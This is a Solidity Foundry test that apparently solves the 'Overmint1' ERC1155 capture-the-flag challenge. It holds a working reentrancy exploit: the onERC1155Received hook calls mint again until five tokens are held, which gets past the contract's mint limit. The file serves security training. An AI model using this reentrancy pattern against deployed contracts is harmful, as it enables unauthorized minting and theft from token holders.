// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {Overmint1_ERC1155} from "../src/Overmint1-ERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract Overmint1ERC1155Test is Test{
    Overmint1_ERC1155 private overmint1155;

    function setUp() public {
        overmint1155 = new Overmint1_ERC1155();
    }

    // Attack Path:
    // 1. call the mint function
    // 2. inside the onERC1155Received hook, call the mint function again until balanceOf(address(this), id) < 5
    
    function testAttack() public {
        overmint1155.mint(1, "");
        assertEq(overmint1155.success(address(this), 1), true);
    }

    function onERC1155Received(address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) public returns (bytes4) {
        if(overmint1155.balanceOf(address(this), 1) < 5) {
            overmint1155.mint(1, "");
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }
}